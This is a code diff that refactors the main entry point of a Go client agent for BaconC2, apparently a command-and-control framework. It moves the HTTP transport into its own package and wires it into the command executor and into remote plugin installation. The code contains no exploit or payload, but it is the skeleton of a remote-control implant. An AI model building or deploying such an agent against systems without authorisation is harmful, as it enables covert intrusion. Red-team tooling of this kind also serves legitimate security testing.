@@ -18,6 +18,7 @@ import (
 	clientplugins "github.com/RabbITCybErSeC/BaconC2/client/core/plugins"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/state"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
+	httptransport "github.com/RabbITCybErSeC/BaconC2/client/core/transport/http"
 	command_handler "github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers/filesystem"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/logging"
@@ -60,17 +61,15 @@ func main() {
 
 	encoderChain := encoders.NewChainEncoder([]encoders.Encoder{encoders.DummyEncoder{}})
 
-	transportProtocol := transport.NewHTTPClientTransport(cfg.ServerURL, cfg.AgentID, cmdQueue, resultQueue, encoderChain)
+	httpTransport := httptransport.NewHTTPClientTransport(cfg.ServerURL, cfg.AgentID, cmdQueue, resultQueue, encoderChain)
 	wsTransport := transport.NewWebSocketTransport(cfg.ServerURL, cfg.AgentID)
 
-	// Initialize agent state
 	agentState := state.NewAgentState()
 
-	// Setup command registry
 	commandRegistry := command_handler.GetGlobalCommandRegistry()
 	commandRegistry.RegisterHandler(command_handler.CommandHandler{
 		Name:    "return_results",
-		Handler: transportProtocol.SendResults,
+		Handler: httpTransport.SendResults,
 	})
 
 	commandRegistry.RegisterStatefulHandler(filesystem.NewCdHandler())
@@ -80,8 +79,7 @@ func main() {
 	pluginDir := "./plugins"
 	pluginManager := plugins.NewPluginManager(pluginDir, commandRegistry, agentState)
 
-	// Register plugin management commands
-	pluginCommands := clientplugins.NewPluginCommands(pluginManager)
+	pluginCommands := clientplugins.NewPluginCommands(pluginManager, httpTransport)
 	commandRegistry.RegisterHandler(command_handler.CommandHandler{
 		Name:    "plugin_install",
 		Handler: pluginCommands.HandlePluginInstall,
@@ -110,8 +108,8 @@ func main() {
 
 	logging.Info("Plugin system initialized (%d plugins loaded)", pluginManager.GetRegistry().Count())
 
-	commandExecutor := executor.NewDefaultCommandExecutor(cmdQueue, resultQueue, transportProtocol, wsTransport, cfg, commandRegistry, agentState)
-	client := agent.NewAgentClient(cfg, transportProtocol, commandExecutor, cmdQueue, resultQueue)
+	commandExecutor := executor.NewDefaultCommandExecutor(cmdQueue, resultQueue, httpTransport, wsTransport, cfg, commandRegistry, agentState)
+	client := agent.NewAgentClient(cfg, httpTransport, commandExecutor, cmdQueue, resultQueue)
 
 	if err := client.Initialize(); err != nil {
 		logging.Error("Failed to initialize agent: %v", err)
